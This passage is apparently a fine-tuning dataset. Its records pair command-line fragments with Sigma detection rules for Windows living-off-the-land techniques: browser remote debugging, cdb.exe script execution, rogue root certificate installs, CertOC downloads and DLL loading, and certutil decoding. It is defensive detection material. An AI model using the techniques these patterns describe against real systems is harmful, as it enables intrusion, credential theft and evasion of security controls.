--remote-debugging-pipe....etc\n        CommandLine|contains: ' --remote-debugging-'\n    selection_firefox:\n        Image|endswith: '\\firefox.exe'\n        CommandLine|contains: ' -start-debugger-server'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--remote-debugging- \\firefox -start-debugger-server", "output": "title: Browser Started with Remote Debugging\nid: b3d34dc5-2efd-4ae3-845f-8ec14921f449\nrelated:\n    - id: 3e8207c5-fcd2-4ea6-9418-15d45b4890e4\n      type: derived\nstatus: test\ndescription: Detects browsers starting with the remote debugging flags. Which is a technique often used to perform browser injection attacks\nreferences:\n    - https://yoroi.company/wp-content/uploads/2022/05/EternityGroup_report_compressed.pdf\n    - https://www.mdsec.co.uk/2022/10/analysing-lastpass-part-1/\n    - https://github.com/defaultnamehere/cookie_crimes/\n    - https://github.com/wunderwuzzi23/firefox-cookiemonster\nauthor: pH-T (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-27\nmodified: 2022-12-23\ntags:\n    - attack.credential-access\n    - attack.collection\n    - attack.t1185\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_chromium_based:\n        # Covers: --remote-debugging-address, --remote-debugging-port, --remote-debugging-socket-name, --remote-debugging-pipe....etc\n        CommandLine|contains: ' --remote-debugging-'\n    selection_firefox:\n        Image|endswith: '\\firefox.exe'\n        CommandLine|contains: ' -start-debugger-server'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--remote-debugging- -start-debugger-server \\firefox.exe", "output": "title: Browser Started with Remote Debugging\nid: b3d34dc5-2efd-4ae3-845f-8ec14921f449\nrelated:\n    - id: 3e8207c5-fcd2-4ea6-9418-15d45b4890e4\n      type: derived\nstatus: test\ndescription: Detects browsers starting with the remote debugging flags. Which is a technique often used to perform browser injection attacks\nreferences:\n    - https://yoroi.company/wp-content/uploads/2022/05/EternityGroup_report_compressed.pdf\n    - https://www.mdsec.co.uk/2022/10/analysing-lastpass-part-1/\n    - https://github.com/defaultnamehere/cookie_crimes/\n    - https://github.com/wunderwuzzi23/firefox-cookiemonster\nauthor: pH-T (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-27\nmodified: 2022-12-23\ntags:\n    - attack.credential-access\n    - attack.collection\n    - attack.t1185\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_chromium_based:\n        # Covers: --remote-debugging-address, --remote-debugging-port, --remote-debugging-socket-name, --remote-debugging-pipe....etc\n        CommandLine|contains: ' --remote-debugging-'\n    selection_firefox:\n        Image|endswith: '\\firefox.exe'\n        CommandLine|contains: ' -start-debugger-server'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cdb.exe CDB.Exe -c -cf", "output": "title: Potential Binary Proxy Execution Via Cdb.EXE\nid: b5c7395f-e501-4a08-94d4-57fe7a9da9d2\nstatus: test\ndescription: Detects usage of \"cdb.exe\" to launch arbitrary processes or commands from a debugger script file\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/\n    - https://web.archive.org/web/20170715043507/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html\n    - https://twitter.com/nas_bench/status/1534957360032120833\nauthor: Beyu Denis, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-26\nmodified: 2024-04-22\ntags:\n    - attack.execution\n    - attack.t1106\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cdb.exe'\n        - OriginalFileName: 'CDB.Exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -c ' # Using a debugger script\n            - ' -cf '\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use of debugging tools\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cdb.exe \\\"CDB\\\".Exe -c -cf", "output": "title: Potential Binary Proxy Execution Via Cdb.EXE\nid: b5c7395f-e501-4a08-94d4-57fe7a9da9d2\nstatus: test\ndescription: Detects usage of \"cdb.exe\" to launch arbitrary processes or commands from a debugger script file\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/\n    - https://web.archive.org/web/20170715043507/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html\n    - https://twitter.com/nas_bench/status/1534957360032120833\nauthor: Beyu Denis, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-26\nmodified: 2024-04-22\ntags:\n    - attack.execution\n    - attack.t1106\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cdb.exe'\n        - OriginalFileName: 'CDB.Exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -c ' # Using a debugger script\n            - ' -cf '\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use of debugging tools\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cdb CDB -c -cf", "output": "title: Potential Binary Proxy Execution Via Cdb.EXE\nid: b5c7395f-e501-4a08-94d4-57fe7a9da9d2\nstatus: test\ndescription: Detects usage of \"cdb.exe\" to launch arbitrary processes or commands from a debugger script file\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/\n    - https://web.archive.org/web/20170715043507/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html\n    - https://twitter.com/nas_bench/status/1534957360032120833\nauthor: Beyu Denis, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-26\nmodified: 2024-04-22\ntags:\n    - attack.execution\n    - attack.t1106\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cdb.exe'\n        - OriginalFileName: 'CDB.Exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -c ' # Using a debugger script\n            - ' -cf '\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use of debugging tools\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cdb.exe -c -cf CDB.Exe", "output": "title: Potential Binary Proxy Execution Via Cdb.EXE\nid: b5c7395f-e501-4a08-94d4-57fe7a9da9d2\nstatus: test\ndescription: Detects usage of \"cdb.exe\" to launch arbitrary processes or commands from a debugger script file\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/\n    - https://web.archive.org/web/20170715043507/http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html\n    - https://twitter.com/nas_bench/status/1534957360032120833\nauthor: Beyu Denis, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-26\nmodified: 2024-04-22\ntags:\n    - attack.execution\n    - attack.t1106\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cdb.exe'\n        - OriginalFileName: 'CDB.Exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -c ' # Using a debugger script\n            - ' -cf '\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use of debugging tools\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\CertMgr.exe CERTMGT.EXE /add root", "output": "title: New Root Certificate Installed Via CertMgr.EXE\nid: ff992eac-6449-4c60-8c1d-91c9722a1d48\nrelated:\n    - id: 42821614-9264-4761-acfc-5772c3286f76\n      type: derived\n    - id: 46591fae-7a4c-46ea-aec3-dff5e6d785dc\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of \"certmgr\" with the \"add\" flag in order to install a new certificate on the system.\n    Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md\n    - https://securelist.com/to-crypt-or-to-mine-that-is-the-question/86307/\nauthor: oscd.community, @redcanary, Zach Stanford @svch0st\ndate: 2023-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1553.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: CertMgr.exe /add CertificateFileName.cer /s /r localMachine root /all\n    selection_img:\n        - Image|endswith: '\\CertMgr.exe'\n        - OriginalFileName: 'CERTMGT.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/add'\n            - 'root'\n    condition: all of selection_*\nfalsepositives:\n    - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn't trigger FP\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\CertMgr.exe \\\"CERTM\\\"GT.EXE /add root", "output": "title: New Root Certificate Installed Via CertMgr.EXE\nid: ff992eac-6449-4c60-8c1d-91c9722a1d48\nrelated:\n    - id: 42821614-9264-4761-acfc-5772c3286f76\n      type: derived\n    - id: 46591fae-7a4c-46ea-aec3-dff5e6d785dc\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of \"certmgr\" with the \"add\" flag in order to install a new certificate on the system.\n    Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md\n    - https://securelist.com/to-crypt-or-to-mine-that-is-the-question/86307/\nauthor: oscd.community, @redcanary, Zach Stanford @svch0st\ndate: 2023-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1553.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: CertMgr.exe /add CertificateFileName.cer /s /r localMachine root /all\n    selection_img:\n        - Image|endswith: '\\CertMgr.exe'\n        - OriginalFileName: 'CERTMGT.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/add'\n            - 'root'\n    condition: all of selection_*\nfalsepositives:\n    - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn't trigger FP\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\CertMgr CERTMGT /add root", "output": "title: New Root Certificate Installed Via CertMgr.EXE\nid: ff992eac-6449-4c60-8c1d-91c9722a1d48\nrelated:\n    - id: 42821614-9264-4761-acfc-5772c3286f76\n      type: derived\n    - id: 46591fae-7a4c-46ea-aec3-dff5e6d785dc\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of \"certmgr\" with the \"add\" flag in order to install a new certificate on the system.\n    Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md\n    - https://securelist.com/to-crypt-or-to-mine-that-is-the-question/86307/\nauthor: oscd.community, @redcanary, Zach Stanford @svch0st\ndate: 2023-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1553.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: CertMgr.exe /add CertificateFileName.cer /s /r localMachine root /all\n    selection_img:\n        - Image|endswith: '\\CertMgr.exe'\n        - OriginalFileName: 'CERTMGT.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/add'\n            - 'root'\n    condition: all of selection_*\nfalsepositives:\n    - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn't trigger FP\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\CertMgr.exe CERTMGT.EXE /add root", "output": "title: New Root Certificate Installed Via CertMgr.EXE\nid: ff992eac-6449-4c60-8c1d-91c9722a1d48\nrelated:\n    - id: 42821614-9264-4761-acfc-5772c3286f76\n      type: derived\n    - id: 46591fae-7a4c-46ea-aec3-dff5e6d785dc\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of \"certmgr\" with the \"add\" flag in order to install a new certificate on the system.\n    Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md\n    - https://securelist.com/to-crypt-or-to-mine-that-is-the-question/86307/\nauthor: oscd.community, @redcanary, Zach Stanford @svch0st\ndate: 2023-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1553.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: CertMgr.exe /add CertificateFileName.cer /s /r localMachine root /all\n    selection_img:\n        - Image|endswith: '\\CertMgr.exe'\n        - OriginalFileName: 'CERTMGT.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - '/add'\n            - 'root'\n    condition: all of selection_*\nfalsepositives:\n    - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn't trigger FP\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certoc.exe CertOC.exe -GetCACAPS http", "output": "title: File Download via CertOC.EXE\nid: 70ad0861-d1fe-491c-a45f-fa48148a300d\nrelated:\n    - id: b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a\n      type: similar\nstatus: test\ndescription: Detects when a user downloads a file by using CertOC.exe\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Certoc/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-16\nmodified: 2023-10-18\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certoc.exe'\n        - OriginalFileName: 'CertOC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-GetCACAPS'\n            - 'http'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certoc.exe \\\"CertOC.exe\\\" \\\"-GetCACAPS\\\" http", "output": "title: File Download via CertOC.EXE\nid: 70ad0861-d1fe-491c-a45f-fa48148a300d\nrelated:\n    - id: b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a\n      type: similar\nstatus: test\ndescription: Detects when a user downloads a file by using CertOC.exe\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Certoc/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-16\nmodified: 2023-10-18\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certoc.exe'\n        - OriginalFileName: 'CertOC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-GetCACAPS'\n            - 'http'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certoc CertOC -GetCACAPS http", "output": "title: File Download via CertOC.EXE\nid: 70ad0861-d1fe-491c-a45f-fa48148a300d\nrelated:\n    - id: b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a\n      type: similar\nstatus: test\ndescription: Detects when a user downloads a file by using CertOC.exe\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Certoc/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-16\nmodified: 2023-10-18\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certoc.exe'\n        - OriginalFileName: 'CertOC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-GetCACAPS'\n            - 'http'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certoc.exe CertOC.exe http -GetCACAPS", "output": "title: File Download via CertOC.EXE\nid: 70ad0861-d1fe-491c-a45f-fa48148a300d\nrelated:\n    - id: b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a\n      type: similar\nstatus: test\ndescription: Detects when a user downloads a file by using CertOC.exe\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Certoc/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-16\nmodified: 2023-10-18\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certoc.exe'\n        - OriginalFileName: 'CertOC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-GetCACAPS'\n            - 'http'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certoc.exe CertOC.exe -LoadDLL", "output": "title: DLL Loaded via CertOC.EXE\nid: 242301bc-f92f-4476-8718-78004a6efd9f\nrelated:\n    - id: 84232095-ecca-4015-b0d7-7726507ee793\n      type: similar\nstatus: test\ndescription: Detects when a user installs certificates by using CertOC.exe to loads the target DLL file.\nreferences:\n    - https://twitter.com/sblmsrsn/status/1445758411803480072?s=20\n    - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-fe98e74189873d6df72a15df2eaa0315c59ba9cdaca93ecd68afc4ea09194ef2\n    - https://lolbas-project.github.io/lolbas/Binaries/Certoc/\nauthor: Austin Songer @austinsonger\ndate: 2021-10-23\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certoc.exe'\n        - OriginalFileName: 'CertOC.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -LoadDLL '\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certoc.exe \"CertOC.exe\" -LoadDLL", "output": "title: DLL Loaded via CertOC.EXE\nid: 242301bc-f92f-4476-8718-78004a6efd9f\nrelated:\n    - id: 84232095-ecca-4015-b0d7-7726507ee793\n      type: similar\nstatus: test\ndescription: Detects when a user installs certificates by using CertOC.exe to loads the target DLL file.\nreferences:\n    - https://twitter.com/sblmsrsn/status/1445758411803480072?s=20\n    - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-fe98e74189873d6df72a15df2eaa0315c59ba9cdaca93ecd68afc4ea09194ef2\n    - https://lolbas-project.github.io/lolbas/Binaries/Certoc/\nauthor: Austin Songer @austinsonger\ndate: 2021-10-23\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certoc.exe'\n        - OriginalFileName: 'CertOC.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -LoadDLL '\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certoc CertOC -LoadDLL", "output": "title: DLL Loaded via CertOC.EXE\nid: 242301bc-f92f-4476-8718-78004a6efd9f\nrelated:\n    - id: 84232095-ecca-4015-b0d7-7726507ee793\n      type: similar\nstatus: test\ndescription: Detects when a user installs certificates by using CertOC.exe to loads the target DLL file.\nreferences:\n    - https://twitter.com/sblmsrsn/status/1445758411803480072?s=20\n    - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-fe98e74189873d6df72a15df2eaa0315c59ba9cdaca93ecd68afc4ea09194ef2\n    - https://lolbas-project.github.io/lolbas/Binaries/Certoc/\nauthor: Austin Songer @austinsonger\ndate: 2021-10-23\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certoc.exe'\n        - OriginalFileName: 'CertOC.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -LoadDLL '\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certoc.exe CertOC.exe -LoadDLL", "output": "title: DLL Loaded via CertOC.EXE\nid: 242301bc-f92f-4476-8718-78004a6efd9f\nrelated:\n    - id: 84232095-ecca-4015-b0d7-7726507ee793\n      type: similar\nstatus: test\ndescription: Detects when a user installs certificates by using CertOC.exe to loads the target DLL file.\nreferences:\n    - https://twitter.com/sblmsrsn/status/1445758411803480072?s=20\n    - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-fe98e74189873d6df72a15df2eaa0315c59ba9cdaca93ecd68afc4ea09194ef2\n    - https://lolbas-project.github.io/lolbas/Binaries/Certoc/\nauthor: Austin Songer @austinsonger\ndate: 2021-10-23\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certoc.exe'\n        - OriginalFileName: 'CertOC.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -LoadDLL '\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe -addstore root", "output": "title: New Root Certificate Installed Via Certutil.EXE\nid: d2125259-ddea-4c1c-9c22-977eb5b29cf0\nrelated:\n    - id: 42821614-9264-4761-acfc-5772c3286f76\n      type: derived\n    - id: 46591fae-7a4c-46ea-aec3-dff5e6d785dc\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of \"certutil\" with the \"addstore\" flag in order to install a new certificate on the system.\n    Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md\nauthor: oscd.community, @redcanary, Zach Stanford @svch0st\ndate: 2023-03-05\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1553.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: certutil -addstore -f -user ROOT CertificateFileName.der\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli_add:\n        CommandLine|contains|windash: '-addstore'\n    selection_cli_store:\n        CommandLine|contains: 'root'\n    condition: all of selection_*\nfalsepositives:\n    - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn't trigger FP\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe \"CertUt\"il.exe -addstore root", "output": "title: New Root Certificate Installed Via Certutil.EXE\nid: d2125259-ddea-4c1c-9c22-977eb5b29cf0\nrelated:\n    - id: 42821614-9264-4761-acfc-5772c3286f76\n      type: derived\n    - id: 46591fae-7a4c-46ea-aec3-dff5e6d785dc\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of \"certutil\" with the \"addstore\" flag in order to install a new certificate on the system.\n    Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md\nauthor: oscd.community, @redcanary, Zach Stanford @svch0st\ndate: 2023-03-05\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1553.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: certutil -addstore -f -user ROOT CertificateFileName.der\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli_add:\n        CommandLine|contains|windash: '-addstore'\n    selection_cli_store:\n        CommandLine|contains: 'root'\n    condition: all of selection_*\nfalsepositives:\n    - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn't trigger FP\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe --add-store root", "output": "title: New Root Certificate Installed Via Certutil.EXE\nid: d2125259-ddea-4c1c-9c22-977eb5b29cf0\nrelated:\n    - id: 42821614-9264-4761-acfc-5772c3286f76\n      type: derived\n    - id: 46591fae-7a4c-46ea-aec3-dff5e6d785dc\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of \"certutil\" with the \"addstore\" flag in order to install a new certificate on the system.\n    Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md\nauthor: oscd.community, @redcanary, Zach Stanford @svch0st\ndate: 2023-03-05\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1553.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: certutil -addstore -f -user ROOT CertificateFileName.der\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli_add:\n        CommandLine|contains|windash: '-addstore'\n    selection_cli_store:\n        CommandLine|contains: 'root'\n    condition: all of selection_*\nfalsepositives:\n    - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn't trigger FP\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil CertUtil -addstore root", "output": "title: New Root Certificate Installed Via Certutil.EXE\nid: d2125259-ddea-4c1c-9c22-977eb5b29cf0\nrelated:\n    - id: 42821614-9264-4761-acfc-5772c3286f76\n      type: derived\n    - id: 46591fae-7a4c-46ea-aec3-dff5e6d785dc\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of \"certutil\" with the \"addstore\" flag in order to install a new certificate on the system.\n    Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md\nauthor: oscd.community, @redcanary, Zach Stanford @svch0st\ndate: 2023-03-05\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1553.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: certutil -addstore -f -user ROOT CertificateFileName.der\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli_add:\n        CommandLine|contains|windash: '-addstore'\n    selection_cli_store:\n        CommandLine|contains: 'root'\n    condition: all of selection_*\nfalsepositives:\n    - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn't trigger FP\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe -addstore root CertUtil.exe", "output": "title: New Root Certificate Installed Via Certutil.EXE\nid: d2125259-ddea-4c1c-9c22-977eb5b29cf0\nrelated:\n    - id: 42821614-9264-4761-acfc-5772c3286f76\n      type: derived\n    - id: 46591fae-7a4c-46ea-aec3-dff5e6d785dc\n      type: obsolete\nstatus: test\ndescription: |\n    Detects execution of \"certutil\" with the \"addstore\" flag in order to install a new certificate on the system.\n    Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md\nauthor: oscd.community, @redcanary, Zach Stanford @svch0st\ndate: 2023-03-05\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1553.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: certutil -addstore -f -user ROOT CertificateFileName.der\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli_add:\n        CommandLine|contains|windash: '-addstore'\n    selection_cli_store:\n        CommandLine|contains: 'root'\n    condition: all of selection_*\nfalsepositives:\n    - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn't trigger FP\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe -decode -decodehex", "output": "title: File Decoded From Base64/Hex Via Certutil.EXE\nid: cc9cbe82-7bc0-4ef5-bc23-bbfb83947be7\nstatus: test\ndescription: Detects the execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files. This can be abused by attackers to decode an encoded payload before execution\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\n    - https://news.sophos.com/en-us/2021/04/13/compromised-exchange-server-hosting-cryptojacker-targeting-other-exchange-servers/\n    - https://twitter.com/JohnLaTwC/status/835149808817991680\n    - https://learn.microsoft.com/en-us/archive/blogs/pki/basic-crl-checking-with-certutil\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2023-02-15\nmodified: 2025-06-04\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    